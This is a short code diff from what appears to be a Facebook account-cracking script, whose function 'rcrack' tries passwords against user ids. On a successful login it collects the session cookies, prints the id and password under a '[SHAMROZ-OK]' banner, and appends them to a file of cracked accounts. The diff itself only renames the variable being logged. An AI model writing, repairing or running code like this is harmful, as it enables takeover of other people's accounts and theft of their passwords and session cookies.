@@ -283,9 +283,9 @@ def rcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\33[1;92m[SHAMROZ-OK] '+uid+' | '+ps+'\33[0;97m')
+				print('\33[1;92m[SHAMROZ-OK] '+iid+' | '+ps+'\33[0;97m')
 				cek_apk(session,coki)
-				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+				open('ok.txt', 'a').write(iid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			else:
